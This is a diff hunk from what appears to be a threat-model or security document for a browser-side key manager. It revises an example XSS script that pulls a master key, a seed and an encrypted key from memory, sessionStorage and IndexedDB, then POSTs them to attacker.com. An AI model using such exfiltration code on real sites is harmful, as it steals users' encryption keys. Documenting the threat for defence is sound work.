@@ -46,8 +46,17 @@ fetch('https://attacker.com/steal', { method: 'POST', body: cmk });
 
 // Or if an XSS vulnerability exists, attacker could exploit it:
 <script>
-  const keys = sessionStorage.getItem('encrypted-cmk');
-  fetch('https://attacker.com/steal', { method: 'POST', body: keys });
+  // Access CMK from memory
+  const cmk = ClientRegistry.getKeyManager().getCMK();
+
+  // Or if auto-unlock is enabled, steal components:
+  const seed = sessionStorage.getItem('agam_client_seed');
+  const encryptedCMK = await indexedDB.open('agam').get('session_cmk');
+
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({ cmk, seed, encryptedCMK })
+  });
 </script>
 ```
 
